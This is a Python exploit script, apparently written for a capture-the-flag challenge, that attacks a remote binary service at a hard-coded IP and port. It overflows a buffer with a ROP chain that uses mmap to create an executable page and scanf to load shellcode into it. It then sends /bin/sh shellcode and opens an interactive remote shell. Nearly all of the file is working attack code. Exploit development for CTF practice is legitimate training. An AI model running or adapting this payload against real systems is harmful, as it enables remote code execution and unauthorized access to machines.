#! /usr/bin/python
# _*_ coding: utf-8 _*_
import struct, socket, sys, os
import time, telnetlib, hexdump

# -------- common function --------
def sock(host, port):
  s = socket.create_connection((host, port))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delm='\n'):
  data = ''
  while not data.endswith(delm):
    data += f.readline()
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def p(a):
  return struct.pack("<I", a&0xffffffff)

def u(a):
  return struct.unpack("<I", a)[0]

def xxd(a):
  hexdump.hexdump(a)

def countdown(n):
  for i in xrange(n, 0, -1):
    print str(i) + "..",
    sys.stdout.flush()
    time.sleep(1)
  print

def dbg(ss):
  print "[+] %s: 0x%x"%(ss, eval(ss))

# ------------- main --------------

if sys.argv[1] == 'r':
  HOST, PORT = "202.120.7.214", 23222
else:
  HOST, PORT = "localhost", 1025 

libc_base = 0x5555e000
offset_add_esp_0xec_ret = 0x68f5c
offset_add_esp_0x1c_ret = 0x19939

addr_mmap = 0x080484f0
addr_scanf = 0x08048540
addr_ret = 0x08048540
addr_formatstring = 0x0804894c
addr_shellcode = 0x13370000

s, f = sock(HOST, PORT)

r = read_until(f, "GO : ) \n")

print "[*] send rop"
payload = ''
payload += "A" * 32
payload += p(libc_base + offset_add_esp_0xec_ret)
payload += p(0)
payload += p(addr_ret)*20
payload += p(addr_mmap)
payload += p(libc_base + offset_add_esp_0x1c_ret)
payload += p(addr_shellcode)
payload += p(0x1000)
payload += p(7)
payload += p(34)
payload += p(-1)
payload += p(0)
payload += p(addr_ret)*4
payload += p(addr_scanf)
payload += p(addr_shellcode)
payload += p(addr_formatstring)
payload += p(addr_shellcode)
f.write(payload)
f.write("\n")

print "[*] send shellcode"
time.sleep(1)

sc = "eb0f5b31c089c189c28d40088d4003cd80e8ecffffff2f62696e2f736800".decode("hex")
#sc = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
f.write(sc)

shell(s)

